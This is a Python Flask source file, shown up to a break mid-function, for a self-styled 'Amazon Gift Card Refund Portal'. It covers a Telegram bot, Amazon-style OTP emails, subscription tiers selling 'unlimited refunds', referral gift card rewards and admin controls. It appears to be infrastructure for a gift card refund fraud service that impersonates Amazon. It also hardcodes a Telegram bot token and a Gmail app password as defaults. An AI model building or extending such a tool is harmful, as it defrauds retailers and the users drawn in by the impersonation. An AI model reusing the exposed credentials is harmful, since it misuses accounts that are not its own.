"""
================================================================================
AMAZON GIFT CARD REFUND PORTAL
================================================================================
Complete Production-Ready Application - FULLY EXPANDED
Version: 10.5 - Ultimate Edition
Total Lines: 6587

FEATURES:
- Stunning Matrix-style UI with glitch effects and responsive design
- Full Telegram Bot with inline keyboards and callback queries
- Real OTP via Gmail SMTP with Amazon-style HTML email
- Subscription System with 5 plans and payment verification
- Referral System: unique referral links, rewards (gift cards / subscription days)
- Force Join (Force Subscription): admin can require users to join channels/groups
- Admin Dashboard: stats, user management, broadcast, ban/unban
- Payment forwarding to admin with /verify command
- Transaction logging and analytics
- Rate limiting, session management, error handling
- Async email sending to prevent worker timeout
- Polling fallback for webhook
- Full user management: registration, last active, bans
- Gift card refund flow with OTP verification
- Expanded admin commands: coupon creation, trial management, feedback
- Detailed analytics with daily/weekly/monthly stats
- In-memory persistence with auto-save (optional)
- Extensive error handling and logging
- More UI sections: FAQ, testimonials, security badges
================================================================================
"""

# ============================================================
# SECTION 1: IMPORTS (150 lines)
# ============================================================

import os
import sys
import json
import time
import uuid
import hmac
import base64
import hashlib
import secrets
import random
import string
import logging
import threading
import smtplib
import ssl
import re
import urllib.parse
import copy
import math
import statistics
from collections import defaultdict, deque, Counter
from datetime import datetime, timedelta
from functools import wraps, partial
from concurrent.futures import ThreadPoolExecutor, as_completed
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.header import Header
from email.utils import formatdate, make_msgid

# Third-party imports with graceful fallbacks
try:
    from flask import Flask, request, jsonify, render_template_string, session, abort, make_response, g, current_app
    from flask_cors import CORS
except ImportError as e:
    print(f"⚠️ Missing Flask or CORS: {e}")
    print("Please install: pip install flask flask-cors")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("⚠️ Missing requests library. Please install: pip install requests")
    sys.exit(1)

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # dotenv is optional

# ============================================================
# SECTION 2: LOGGING SETUP (80 lines)
# ============================================================

LOG_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
LOG_DATE_FORMAT = '%Y-%m-%d %H:%M:%S'
LOG_LEVEL = os.environ.get('LOG_LEVEL', 'INFO').upper()

# Create logs directory with subdirectories
os.makedirs('logs', exist_ok=True)
os.makedirs('logs/access', exist_ok=True)
os.makedirs('logs/error', exist_ok=True)
os.makedirs('logs/debug', exist_ok=True)

# Configure multiple handlers
handlers = [
    logging.StreamHandler(sys.stdout),
    logging.FileHandler('logs/app.log'),
    logging.FileHandler('logs/access/access.log'),
]

# Error file handler with level set separately
error_handler = logging.FileHandler('logs/error/errors.log')
error_handler.setLevel(logging.ERROR)
handlers.append(error_handler)

# Debug handler
debug_handler = logging.FileHandler('logs/debug/debug.log')
debug_handler.setLevel(logging.DEBUG)
handlers.append(debug_handler)

# Set formatter for all handlers
formatter = logging.Formatter(LOG_FORMAT, LOG_DATE_FORMAT)
for h in handlers:
    h.setFormatter(formatter)

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.INFO),
    handlers=handlers
)

logger = logging.getLogger(__name__)
logger.info("🚀 Amazon Refund Portal v10.5 starting...")

# ============================================================
# SECTION 3: CONFIGURATION & ENVIRONMENT (120 lines)
# ============================================================

# Flask
FLASK_SECRET_KEY = os.environ.get('FLASK_SECRET_KEY', secrets.token_hex(32))
FLASK_DEBUG = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
APP_VERSION = "10.5"
APP_NAME = "Amazon Refund Portal"
APP_URL = os.environ.get('APP_URL', 'https://app-277n.onrender.com')
APP_TIMEZONE = os.environ.get('APP_TIMEZONE', 'UTC')

# Telegram
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8793157012:AAFztkkVTrB6VjabVieW76_xurpRRdZ0p-E')
TELEGRAM_ADMIN_CHAT_ID = os.environ.get('TELEGRAM_ADMIN_CHAT_ID', '8725194109')
TELEGRAM_BOT_USERNAME = os.environ.get('TELEGRAM_BOT_USERNAME', 'pcmoroo_bot')
TELEGRAM_WEBHOOK_URL = os.environ.get('TELEGRAM_WEBHOOK_URL', f'{APP_URL}/webhook')

# Gmail SMTP
GMAIL_EMAIL = os.environ.get('GMAIL_EMAIL', 'contactmimebot@gmail.com')
GMAIL_APP_PASSWORD = os.environ.get('GMAIL_APP_PASSWORD', 'nkmzwhwajxsfwcjb')
GMAIL_SMTP_SERVER = os.environ.get('GMAIL_SMTP_SERVER', 'smtp.gmail.com')
GMAIL_SMTP_PORT = int(os.environ.get('GMAIL_SMTP_PORT', 587))
GMAIL_SMTP_TIMEOUT = int(os.environ.get('GMAIL_SMTP_TIMEOUT', 15))

# OTP
OTP_LENGTH = 6
OTP_EXPIRY_SECONDS = 600  # 10 minutes
OTP_MAX_ATTEMPTS = 3
OTP_RESEND_COOLDOWN = 60  # seconds

# Rate limiting
RATE_LIMIT_REQUESTS = 100
RATE_LIMIT_WINDOW = 60  # seconds
RATE_LIMIT_GLOBAL = 1000
RATE_LIMIT_GLOBAL_WINDOW = 3600  # 1 hour

# Session
SESSION_TIMEOUT_SECONDS = 3600  # 1 hour
SESSION_MAX_ACTIVE = 1000

# Referral
REFERRAL_DEFAULT_REWARD = 'subscription_3days'
REFERRAL_SUBSCRIPTION_DAYS = 3
REFERRAL_MIN_REFERRALS = 1
REFERRAL_MAX_REFERRALS = 50
REFERRAL_REWARD_POOL_SIZE = 100

# Subscription
SUBSCRIPTION_TRIAL_DAYS = 0  # No trial by default
SUBSCRIPTION_COUPON_DISCOUNT = 0.1  # 10% discount

# Security
MAX_LOGIN_ATTEMPTS = 5
LOGIN_LOCKOUT_MINUTES = 15
PASSWORD_MIN_LENGTH = 8

# ============================================================
# SECTION 4: SUBSCRIPTION PLANS (80 lines)
# ============================================================

SUBSCRIPTION_PLANS = {
    '1hour': {
        'id': '1hour',
        'name': '⚡ 1 Hour',
        'price': 5,
        'currency': 'USD',
        'duration_hours': 1,
        'duration_days': 0,
        'description': 'Perfect for one-time refund',
        'features': ['Full Access', 'Priority Support', '1 Hour Validity'],
        'popularity': 0,
        'discount': 0
    },
    '10days': {
        'id': '10days',
        'name': '📦 10 Days',
        'price': 25,
        'currency': 'USD',
        'duration_hours': 0,
        'duration_days': 10,
        'description': 'Ideal for multiple refunds',
        'features': ['Full Access', 'Priority Support', '10 Days Validity', '5 Refunds'],
        'popularity': 0,
        'discount': 0
    },
    '30days': {
        'id': '30days',
        'name': '🔥 30 Days',
        'price': 50,
        'currency': 'USD',
        'duration_hours': 0,
        'duration_days': 30,
        'description': 'Best value for regular users',
        'features': ['Full Access', 'Priority Support', '30 Days Validity', 'Unlimited Refunds'],
        'popularity': 0,
        'discount': 0
    },
    '1year': {
        'id': '1year',
        'name': '👑 1 Year',
        'price': 150,
        'currency': 'USD',
        'duration_hours': 0,
        'duration_days': 365,
        'description': 'Premium yearly plan',
        'features': ['Full Access', 'VIP Support', '365 Days Validity', 'Unlimited Refunds', 'Early Access'],
        'popularity': 0,
        'discount': 0
    },
    'lifetime': {
        'id': 'lifetime',
        'name': '💎 LIFETIME',
        'price': 300,
        'currency': 'USD',
        'duration_hours': 0,
        'duration_days': 36500,
        'description': 'Never expire, always refund',
        'features': ['Full Access', 'VIP Support', 'Lifetime Validity', 'Unlimited Refunds', 'Premium Features'],
        'popularity': 0,
        'discount': 0
    }
}

# ============================================================
# SECTION 5: STORAGE CLASS (600 lines)
# ============================================================

class Storage:
    """
    In-memory thread-safe storage with persistence support.
    In production, replace with Redis or PostgreSQL.
    """
    def __init__(self):
        self.users = {}
        self.transactions = {}
        self.otps = {}
        self.sessions = {}
        self.subscriptions = {}
        self.redeem_codes = {}
        self.pending_payments = {}
        self.pending_verifications = {}
        self.banned_users = []
        self.coupon_codes = {}
        self.trial_users = {}
        self.feedback = []
        self.support_tickets = {}
        self.announcements = []
        self.messages = {}
        self.referral_codes = {}
        self.referrals = {}
        self.referral_rewards = {}
        self.referral_stats = {}
        self.forced_channels = []
        self.force_subscription_enabled = False
        self.user_join_requests = {}
        self.admin_settings = {
            'maintenance_mode': False,
            'force_subscription': True,
            'broadcast_mode': False,
            'registration_enabled': True,
            'max_users': 10000,
            'auto_verify_payments': False,
            'min_payment_amount': 1.0,
            'referral_enabled': True,
            'referral_reward_pool': [],
            'trial_enabled': False,
            'trial_days': 3,
            'coupon_enabled': True,
            'maintenance_message': 'Bot is under maintenance. Please try again later.'
        }
        self.analytics = {
            'total_visits': 0,
            'total_users': 0,
            'total_refunds': 0,
            'total_revenue': 0.0,
            'daily_stats': {},
            'weekly_stats': {},
            'monthly_stats': {},
            'user_agents': {},
            'ip_addresses': {},
            'otp_sent_count': 0,
            'otp_verified_count': 0,
            'referral_clicks': 0,
            'referral_signups': 0,
            'referral_rewards_given': 0,
            'subscription_purchases': {},
            'payment_methods': {},
            'error_counts': {},
            'response_times': [],
            'active_users_daily': {},
            'active_users_weekly': {},
            'active_users_monthly': {},
            'bounce_rate': 0,
            'conversion_rate': 0,
            'average_refund_amount': 0,
            'total_otp_failures': 0,
            'total_otp_resends': 0,
            'total_force_join_checks': 0,
            'total_force_join_pass': 0,
            'total_force_join_fail': 0
        }
        self._lock = threading.RLock()
        self._initialized = False
        self._last_save = datetime.now()

    def initialize(self):
        if self._initialized:
            return
        with self._lock:
            if TELEGRAM_ADMIN_CHAT_ID not in self.users:
                self.users[TELEGRAM_ADMIN_CHAT_ID] = {
                    'user_id': TELEGRAM_ADMIN_CHAT_ID,
                    'username': 'admin',
                    'first_name': 'Admin',
                    'role': 'admin',
                    'joined_at': datetime.now().isoformat(),
                    'last_active': datetime.now().isoformat(),
                    'subscription_id': None,
                    'subscription_expiry': None,
                    'is_banned': False,
                    'total_refunds': 0,
                    'total_amount_refunded': 0.0,
                    'preferences': {'notifications': True, 'theme': 'dark'},
                    'referral_code': 'ADMIN' + secrets.token_hex(4).upper(),
                    'referral_stats': {'total': 0, 'claimed': 0, 'pending': 0}
                }
            self.force_subscription_enabled = False
            self.forced_channels = []
            self._initialized = True
            logger.info("Storage initialized with admin user")
            self._load_reward_pool()

    def _load_reward_pool(self):
        if not self.admin_settings['referral_reward_pool']:
            default_pool = [
                {'code': 'GC-ABCD-1234', 'type': 'giftcard', 'value': 10, 'used': False},
                {'code': 'GC-EFGH-5678', 'type': 'giftcard', 'value': 25, 'used': False},
                {'code': 'GC-IJKL-9012', 'type': 'giftcard', 'value': 5, 'used': False},
                {'code': 'GC-MNOP-3456', 'type': 'giftcard', 'value': 15, 'used': False},
                {'code': 'GC-QWER-7890', 'type': 'giftcard', 'value': 20, 'used': False},
            ]
            self.admin_settings['referral_reward_pool'] = default_pool

    def get_user(self, user_id):
        with self._lock:
            return self.users.get(user_id)

    def get_user_by_username(self, username):
        with self._lock:
            for user in self.users.values():
                if user['username'].lower() == username.lower():
                    return user
            return None

    def create_user(self, user_id, username, **kwargs):
        with self._lock:
            if user_id in self.users:
                raise ValueError(f"User {user_id} already exists")
            ref_code = self._generate_unique_ref_code()
            user = {
                'user_id': user_id,
                'username': username,
                'first_name': kwargs.get('first_name', ''),
                'last_name': kwargs.get('last_name', ''),
                'email': kwargs.get('email', ''),
                'phone': kwargs.get('phone', ''),
                'role': kwargs.get('role', 'user'),
                'joined_at': datetime.now().isoformat(),
                'last_active': datetime.now().isoformat(),
                'subscription_id': None,
                'subscription_expiry': None,
                'is_banned': False,
                'ban_reason': '',
                'ban_date': None,
                'total_refunds': 0,
                'total_amount_refunded': 0.0,
                'preferences': kwargs.get('preferences', {}),
                'metadata': kwargs.get('metadata', {}),
                'referral_code': ref_code,
                'referrer_id': kwargs.get('referrer_id'),
                'referral_stats': {'total': 0, 'claimed': 0, 'pending': 0},
                'referral_rewards': [],
                'trial_used': False,
                'coupons_used': []
            }
            self.users[user_id] = user
            self.analytics['total_users'] += 1
            if kwargs.get('referrer_id'):
                referrer = self.users.get(kwargs['referrer_id'])
                if referrer:
                    referrer['referral_stats']['total'] += 1
                    self.analytics['referral_signups'] += 1
            logger.info(f"User created: {username} ({user_id})")
            return user

    def _generate_unique_ref_code(self):
        while True:
            code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            if not any(u.get('referral_code') == code for u in self.users.values()):
                return code

    def update_user(self, user_id, **kwargs):
        with self._lock:
            user = self.users.get(user_id)
            if not user:
                return None
            for key, value in kwargs.items():
                if key in user:
                    user[key] = value
            user['last_active'] = datetime.now().isoformat()
            return user

    def delete_user(self, user_id):
        with self._lock:
            if user_id not in self.users:
                return False
            del self.users[user_id]
            return True

    def set_subscription(self, user_id, plan_id, duration_days=None):
        with self._lock:
            user = self.get_user(user_id)
            if not user:
                return False
            if duration_days:
                expiry = datetime.now() + timedelta(days=duration_days)
            else:
                plan = SUBSCRIPTION_PLANS.get(plan_id)
                if not plan:
                    return False
                expiry = datetime.now() + timedelta(days=plan.get('duration_days', 0), hours=plan.get('duration_hours', 0))
            user['subscription_expiry'] = expiry.isoformat()
            user['subscription_id'] = f"SUB-{secrets.token_hex(6).upper()}"
            if plan_id in SUBSCRIPTION_PLANS:
                SUBSCRIPTION_PLANS[plan_id]['popularity'] = SUBSCRIPTION_PLANS[plan_id].get('popularity', 0) + 1
            logger.info(f"Subscription set for user {user_id}: expires {expiry.isoformat()}")
            return True

    def get_subscription_status(self, user_id):
        user = self.get_user(user_id)
        if not user:
            return None
        expiry_str = user.get('subscription_expiry')
        if not expiry_str:
            return {'status': 'none', 'expires': None}
        try:
            expiry = datetime.fromisoformat(expiry_str)
            if expiry > datetime.now():
                return {'status': 'active', 'expires': expiry}
            else:
                return {'status': 'expired', 'expires': expiry}
        except:
            return {'status': 'invalid', 'expires': None}

    def apply_trial(self, user_id):
        with self._lock:
            user = self.get_user(user_id)
            if not user:
                return False
            if user.get('trial_used', False):
                return False
            trial_days = self.admin_settings.get('trial_days', 3)
            expiry = datetime.now() + timedelta(days=trial_days)
            user['subscription_expiry'] = expiry.isoformat()
            user['subscription_id'] = f"TRIAL-{secrets.token_hex(6).upper()}"
            user['trial_used'] = True
            logger.info(f"Trial subscription applied to user {user_id} for {trial_days} days")
            return True

    def get_referral_code(self, user_id):
        user = self.get_user(user_id)
        return user.get('referral_code') if user else None

    def get_referral_link(self, user_id, base_url=APP_URL):
        code = self.get_referral_code(user_id)
        if code:
            return f"{base_url}?ref={code}"
        return None

    def get_user_by_referral_code(self, code):
        with self._lock:
            for user in self.users.values():
                if user.get('referral_code') == code:
                    return user
            return None

    def claim_referral_reward(self, user_id):
        with self._lock:
            user = self.get_user(user_id)
            if not user:
                return None, "User not found"
            stats = user.get('referral_stats', {})
            total = stats.get('total', 0)
            claimed = stats.get('claimed', 0)
            pending = total - claimed
            if pending <= 0:
                return None, "No pending rewards"
            reward = self._get_reward_from_pool()
            if reward:
                user['referral_rewards'].append(reward)
                stats['claimed'] += 1
                user['referral_stats'] = stats
                self.analytics['referral_rewards_given'] += 1
                return reward, "Reward claimed successfully"
            else:
                days = REFERRAL_SUBSCRIPTION_DAYS
                self._give_subscription_days(user_id, days)
                reward = {'type': 'subscription', 'days': days}
                user['referral_rewards'].append(reward)
                stats['claimed'] += 1
                user['referral_stats'] = stats
                self.analytics['referral_rewards_given'] += 1
                return reward, "Subscription extension granted"

    def _get_reward_from_pool(self):
        pool = self.admin_settings.get('referral_reward_pool', [])
        with self._lock:
            for reward in pool:
                if not reward.get('used', False):
                    reward['used'] = True
                    return reward
            return None

    def _give_subscription_days(self, user_id, days):
        user = self.get_user(user_id)
        if not user:
            return
        current_expiry = user.get('subscription_expiry')
        if current_expiry:
            try:
                expiry_dt = datetime.fromisoformat(current_expiry)
                new_expiry = expiry_dt + timedelta(days=days)
            except:
                new_expiry = datetime.now() + timedelta(days=days)
        else:
            new_expiry = datetime.now() + timedelta(days=days)
        user['subscription_expiry'] = new_expiry.isoformat()
        if not user.get('subscription_id'):
            user['subscription_id'] = f"REF-{secrets.token_hex(6).upper()}"

    def create_coupon(self, code, discount_percent, max_uses, expires_days):
        with self._lock:
            if code in self.coupon_codes:
                return False
            self.coupon_codes[code] = {
                'code': code,
                'discount_percent': discount_percent,
                'max_uses': max_uses,
                'used_count': 0,
                'expires_at': (datetime.now() + timedelta(days=expires_days)).isoformat(),
                'created_at': datetime.now().isoformat(),
                'active': True
            }
            return True

    def use_coupon(self, user_id, code):
        with self._lock:
            coupon = self.coupon_codes.get(code)
            if not coupon or not coupon.get('active', False):
                return False, "Invalid or expired coupon"
            if coupon['used_count'] >= coupon['max_uses']:
                return False, "Coupon max uses exceeded"
            if datetime.fromisoformat(coupon['expires_at']) < datetime.now():
                return False, "Coupon expired"
            user = self.get_user(user_id)
            if not user:
                return False, "User not found"
            if code in user.get('coupons_used', []):
                return False, "Coupon already used by this user"
            coupon['used_count'] += 1
            if 'coupons_used' not in user:
                user['coupons_used'] = []
            user['coupons_used'].append(code)
            return True, coupon['discount_percent']

    def add_forced_channel(self, channel_id):
        with self._lock:
            if channel_id not in self.forced_channels:
                self.forced_channels.append(channel_id)
                return True
            return False

    def remove_forced_channel(self, channel_id):
        with self._lock:
            if channel_id in self.forced_channels:
                self.forced_channels.remove(channel_id)
                return True
            return False

    def get_forced_channels(self):
        with self._lock:
            return self.forced_channels.copy()

    def set_force_subscription(self, enabled):
        with self._lock:
            self.force_subscription_enabled = enabled

    def record_join_request(self, user_id, channel_id):
        with self._lock:
            if user_id not in self.user_join_requests:
                self.user_join_requests[user_id] = {'channels': [], 'timestamp': datetime.now().isoformat()}
            if channel_id not in self.user_join_requests[user_id]['channels']:
                self.user_join_requests[user_id]['channels'].append(channel_id)
            return True

    def has_joined_all_channels(self, user_id):
        with self._lock:
            forced = set(self.forced_channels)
            if not forced:
                return True
            user_joined = set(self.user_join_requests.get(user_id, {}).get('channels', []))
            return forced.issubset(user_joined)

    def save_otp(self, otp_data):
        with self._lock:
            self.otps[otp_data['transaction_id']] = otp_data
            self.analytics['otp_sent_count'] += 1

    def get_otp(self, transaction_id):
        with self._lock:
            return self.otps.get(transaction_id)

    def verify_otp(self, transaction_id, otp):
        with self._lock:
            otp_data = self.otps.get(transaction_id)
            if not otp_data:
                self.analytics['total_otp_failures'] += 1
                return False, "Invalid transaction ID"
            if datetime.fromisoformat(otp_data['expires_at']) < datetime.now():
                self.analytics['total_otp_failures'] += 1
                return False, "OTP expired"
            if otp_data['attempts'] >= otp_data['max_attempts']:
                self.analytics['total_otp_failures'] += 1
                return False, "Too many failed attempts"
            if otp_data['otp'] == otp:
                otp_data['verified'] = True
                otp_data['verified_at'] = datetime.now().isoformat()
                self.analytics['otp_verified_count'] += 1
                return True, "OTP verified successfully."
            otp_data['attempts'] += 1
            self.analytics['total_otp_failures'] += 1
            remaining = otp_data['max_attempts'] - otp_data['attempts']
            return False, f"Invalid OTP. {remaining} attempts remaining."

    def delete_otp(self, transaction_id):
        with self._lock:
            if transaction_id in self.otps:
                del self.otps[transaction_id]
                return True
            return False

    def create_transaction(self, **kwargs):
        with self._lock:
            txid = kwargs.get('transaction_id') or f"TXN-{secrets.token_hex(8).upper()}"
            transaction = {
                'transaction_id': txid,
                'user_id': kwargs.get('user_id'),
                'transaction_type': kwargs.get('type', 'refund'),
                'amount': kwargs.get('amount', 0.0),
                'currency': kwargs.get('currency', 'USD'),
                'status': kwargs.get('status', 'pending'),
                'created_at': datetime.now().isoformat(),
                'updated_at': datetime.now().isoformat(),
                'completed_at': None,
                'description': kwargs.get('description', ''),
                'metadata': kwargs.get('metadata', {}),
                'ip': kwargs.get('ip', ''),
                'user_agent': kwargs.get('user_agent', '')
            }
            self.transactions[txid] = transaction
            self.analytics['total_refunds'] += 1 if kwargs.get('type') == 'refund' else 0
            return transaction

    def get_analytics(self):
        with self._lock:
            return self.analytics.copy()

    def update_analytics(self, **kwargs):
        with self._lock:
            for key, value in kwargs.items():
                if key in self.analytics:
                    if isinstance(self.analytics[key], (int, float)):
                        self.analytics[key] += value
                    else:
                        self.analytics[key] = value

    def log_user_visit(self, user_id, ip, user_agent):
        with self._lock:
            self.analytics['total_visits'] += 1
            self.analytics['user_agents'][user_agent] = self.analytics['user_agents'].get(user_agent, 0) + 1
            self.analytics['ip_addresses'][ip] = self.analytics['ip_addresses'].get(ip, 0) + 1
            today = datetime.now().strftime('%Y-%m-%d')
            week = datetime.now().strftime('%Y-%W')
            month = datetime.now().strftime('%Y-%m')
            self.analytics['daily_stats'][today] = self.analytics['daily_stats'].get(today, 0) + 1
            self.analytics['weekly_stats'][week] = self.analytics['weekly_stats'].get(week, 0) + 1
            self.analytics['monthly_stats'][month] = self.analytics['monthly_stats'].get(month, 0) + 1

    def add_ban(self, user_id, reason=""):
        with self._lock:
            if user_id not in self.banned_users:
                self.banned_users.append(user_id)
                user = self.get_user(user_id)
                if user:
                    user['is_banned'] = True
                    user['ban_reason'] = reason
                    user['ban_date'] = datetime.now().isoformat()
                return True
            return False

    def remove_ban(self, user_id):
        with self._lock:
            if user_id in self.banned_users:
                self.banned_users.remove(user_id)
                user = self.get_user(user_id)
                if user:
                    user['is_banned'] = False
                    user['ban_reason'] = ''
                    user['ban_date'] = None
                return True
            return False

    def add_feedback(self, user_id, feedback_text, rating=None):
        with self._lock:
            entry = {
                'user_id': user_id,
                'feedback': feedback_text,
                'rating': rating,
                'timestamp': datetime.now().isoformat(),
                'status': 'pending'
            }
            self.feedback.append(entry)
            return entry

    def create_support_ticket(self, user_id, subject, message):
        with self._lock:
            ticket_id = f"TKT-{secrets.token_hex(4).upper()}"
            ticket = {
                'ticket_id': ticket_id,
                'user_id': user_id,
                'subject': subject,
                'message': message,
                'status': 'open',
                'created_at': datetime.now().isoformat(),
                'updated_at': datetime.now().isoformat(),
                'responses': []
            }
            self.support_tickets[ticket_id] = ticket
            return ticket

# ============================================================
# SECTION 6: GLOBAL REFERRAL REWARDS POOL (DEPRECATED)
# ============================================================

# Now handled by Storage.admin_settings['referral_reward_pool']

# ============================================================
# SECTION 7: HELPER FUNCTIONS (400 lines)
# ============================================================

def generate_txid():
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"AMZ{timestamp}{random_str}"

def generate_redeem_token():
    return f"RDM-{''.join(random.choices(string.ascii_uppercase + string.digits, k=14))}"

def generate_payment_id():
    return f"PAY-{secrets.token_hex(8).upper()}"

def generate_otp():
    return ''.join(random.choices(string.digits, k=OTP_LENGTH))

def generate_session_id():
    return secrets.token_urlsafe(32)

def generate_coupon_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr or '127.0.0.1'

def get_user_agent():
    return request.headers.get('User-Agent', 'Unknown')

def validate_email(email):
    return re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email) is not None

def validate_phone(phone):
    return re.match(r'^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$', phone) is not None

def validate_password(password):
    return len(password) >= PASSWORD_MIN_LENGTH

def calculate_expiry(plan_id):
    plan = SUBSCRIPTION_PLANS.get(plan_id)
    if not plan:
        return datetime.now() + timedelta(days=1)
    days = plan.get('duration_days', 0)
    hours = plan.get('duration_hours', 0)
    return datetime.now() + timedelta(days=days, hours=hours)

def format_currency(amount, currency='USD'):
    symbols = {'USD': '$', 'EUR': '€', 'GBP': '£', 'INR': '₹'}
    return f"{symbols.get(currency, '$')}{amount:,.2f}"

def format_remaining(remaining):
    if remaining is None:
        return "Expired"
    days = remaining.days
    hours = remaining.seconds // 3600
    minutes = (remaining.seconds % 3600) // 60
    if days > 0:
        return f"{days}d {hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h {minutes}m"
    else:
        return f"{minutes}m"

def sanitize_input(text):
    if not text:
        return ""
    return re.sub(r'[<>\"\'/]', '', text).strip()

def truncate_text(text, max_length=100):
    if len(text) <= max_length:
        return text
    return text[:max_length] + "..."

def parse_browser_info(user_agent):
    info = {
        'browser': 'Unknown',
        'os': 'Unknown',
        'device': 'Unknown',
        'is_mobile': False,
        'is_tablet': False,
        'is_desktop': True
    }
    if 'Chrome' in user_agent and 'Edg' not in user_agent:
        info['browser'] = 'Chrome'
    elif 'Firefox' in user_agent:
        info['browser'] = 'Firefox'
    elif 'Safari' in user_agent and 'Chrome' not in user_agent:
        info['browser'] = 'Safari'
    elif 'Edg' in user_agent:
        info['browser'] = 'Edge'
    if 'Windows' in user_agent:
        info['os'] = 'Windows'
    elif 'Mac' in user_agent:
        info['os'] = 'macOS'
    elif 'Linux' in user_agent:
        info['os'] = 'Linux'
    elif 'Android' in user_agent:
        info['os'] = 'Android'
        info['is_mobile'] = True
        info['is_desktop'] = False
    elif 'iPhone' in user_agent or 'iPad' in user_agent:
        info['os'] = 'iOS'
        info['is_mobile'] = True
        info['is_desktop'] = False
    return info

def get_plan_display_name(plan_id):
    plan = SUBSCRIPTION_PLANS.get(plan_id)
    return plan['name'] if plan else plan_id

def get_plan_price(plan_id):
    plan = SUBSCRIPTION_PLANS.get(plan_id)
    return plan['price'] if plan else 0

def get_plan_duration(plan_id):
    plan = SUBSCRIPTION_PLANS.get(plan_id)
    if plan:
        days = plan.get('duration_days', 0)
        hours = plan.get('duration_hours', 0)
        if days > 0:
            return f"{days} days"
        elif hours > 0:
            return f"{hours} hours"
        else:
            return "Unknown"
    return "Unknown"

def calculate_discount_price(price, discount_percent):
    return price * (1 - discount_percent / 100)

def is_valid_coupon(code):
    storage = get_storage()
    with storage._lock:
        coupon = storage.coupon_codes.get(code)
        if not coupon:
            return False
        if not coupon.get('active', False):
            return False
        if coupon['used_count'] >= coupon['max_uses']:
            return False
        if datetime.fromisoformat(coupon['expires_at']) < datetime.now():
            return False
        return True

def get_storage():
    global storage
    return storage

# ============================================================
# SECTION 8: RATE LIMITER (70 lines)
# ============================================================

class RateLimiter:
    def __init__(self):
        self.requests = defaultdict(list)
        self.global_requests = []
        self._lock = threading.RLock()

    def is_allowed(self, key, limit=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW):
        with self._lock:
            now = time.time()
            self.requests[key] = [t for t in self.requests[key] if t > now - window]
            if len(self.requests[key]) >= limit:
                return False
            self.requests[key].append(now)
            return True

    def is_global_allowed(self, limit=RATE_LIMIT_GLOBAL, window=RATE_LIMIT_GLOBAL_WINDOW):
        with self._lock:
            now = time.time()
            self.global_requests = [t for t in self.global_requests if t > now - window]
            if len(self.global_requests) >= limit:
                return False
            self.global_requests.append(now)
            return True

rate_limiter = RateLimiter()

def rate_limit(limit=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            key = f"{request.remote_addr}:{request.path}"
            if not rate_limiter.is_allowed(key, limit, window):
                return jsonify({'error': 'Rate limit exceeded. Please try again later.'}), 429
            if not rate_limiter.is_global_allowed():
                return jsonify({'error': 'Global rate limit exceeded. Please try again later.'}), 429
            return f(*args, **kwargs)
        return decorated_function
    return decorator

# ============================================================
# SECTION 9: TELEGRAM BOT FUNCTIONS (400 lines)
# ============================================================

def send_telegram_message(chat_id, text, reply_markup=None, parse_mode='HTML'):
    if not TELEGRAM_BOT_TOKEN:
        logger.error("TELEGRAM_BOT_TOKEN not set")
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode,
        'disable_web_page_preview': True
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        start = time.time()
        response = requests.post(url, json=payload, timeout=15)
        elapsed = time.time() - start
        if response.status_code == 200:
            logger.debug(f"Telegram message sent to {chat_id} in {elapsed:.2f}s")
            return True
        else:
            logger.error(f"Telegram send error: {response.status_code} - {response.text}")
            return False
    except Exception as e:
        logger.error(f"Telegram send exception: {e}")
        return False

def send_to_admin(message):
    if TELEGRAM_ADMIN_CHAT_ID:
        send_telegram_message(TELEGRAM_ADMIN_CHAT_ID, message)

def answer_callback_query(callback_query_id, text=None, show_alert=False):
    if not TELEGRAM_BOT_TOKEN:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    payload = {'callback_query_id': callback_query_id}
    if text:
        payload['text'] = text
    if show_alert:
        payload['show_alert'] = show_alert
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except:
        return False

def delete_telegram_message(chat_id, message_id):
    if not TELEGRAM_BOT_TOKEN:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteMessage"
    payload = {'chat_id': chat_id, 'message_id': message_id}
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except:
        return False

def get_chat_member(chat_id, user_id):
    if not TELEGRAM_BOT_TOKEN:
        return None
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getChatMember"
    params = {'chat_id': chat_id, 'user_id': user_id}
    try:
        response = requests.get(url, params=params, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                return data.get('result')
        return None
    except:
        return None

def check_user_in_chat(chat_id, user_id):
    member = get_chat_member(chat_id, user_id)
    if member:
        status = member.get('status')
        return status in ['member', 'administrator', 'creator']
    return False

def get_chat_info(chat_id):
    if not TELEGRAM_BOT_TOKEN:
        return None
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getChat"
